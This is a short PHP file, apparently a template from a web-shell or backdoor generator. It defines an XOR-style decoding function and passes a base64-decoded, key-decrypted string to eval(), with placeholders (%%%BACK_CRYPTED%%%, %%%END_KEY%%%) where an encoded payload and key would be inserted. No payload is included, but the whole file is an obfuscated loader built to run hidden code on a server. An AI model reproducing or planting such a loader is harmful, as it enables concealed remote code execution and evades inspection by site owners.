<?php
       function c($t='', $k=''){return (($t ^ str_pad("", strlen($t), $k)) & str_repeat("\x1f", strlen($t))) | ($t & str_repeat("\xe0", strlen($t)));}	
       eval(c(base64_decode('%%%BACK_CRYPTED%%%'), '%%%END_KEY%%%'));
       
?>
